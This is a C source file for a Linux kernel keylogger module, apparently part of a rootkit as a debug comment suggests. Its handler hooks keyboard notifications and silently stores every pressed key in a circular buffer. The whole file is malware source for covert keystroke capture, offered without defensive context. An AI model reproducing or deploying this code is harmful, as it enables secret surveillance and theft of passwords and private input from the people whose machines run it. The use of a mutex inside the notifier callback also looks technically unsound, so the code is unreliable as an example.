#include "keylogger.h"

char keylogger[KEYLOGGER_SIZE]; 
size_t logger_index = 0;
DEFINE_MUTEX(keylogger_mutex);
bool first_log = true;

void init_keylogger_buffer(void) {
    memset(keylogger, ' ', KEYLOGGER_SIZE);
}

int keylogger_handler(struct notifier_block* nb, unsigned long action, void* data) {
    struct keyboard_notifier_param* params = data;
    char c = params->value;

    if (!params->down|| action != KBD_KEYSYM) {
        return NOTIFY_OK;
    }

    if (!c) {
        c = ' ';
    }


    mutex_lock(&keylogger_mutex);
    keylogger[logger_index] = c;
    logger_index++;
    if (logger_index >= KEYLOGGER_SIZE) {
        first_log = false;
        logger_index = 0;
    }
    mutex_unlock(&keylogger_mutex);

    
    //DEBUG_PRINTF("rootkit: char was read: %c\n", c)


    return NOTIFY_OK;

}